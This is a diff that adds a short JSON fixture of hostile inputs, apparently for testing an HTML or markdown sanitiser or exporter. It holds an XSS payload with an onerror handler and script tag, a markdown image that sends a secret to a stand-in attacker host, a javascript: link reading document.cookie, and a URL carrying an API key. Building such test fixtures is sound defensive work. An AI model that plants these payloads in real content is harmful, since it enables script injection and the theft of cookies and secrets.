@@ -1,0 +1,6 @@
+{
+  "html": "<img src=x onerror=alert(1)><script>globalThis.pwned=true</script>",
+  "markdownImage": "![tracking](https://attacker.example/pixel?id=secret)",
+  "javascriptLink": "[click](javascript:alert(document.cookie))",
+  "remoteUrl": "https://example.test/path?api_key=should-not-export"
+}
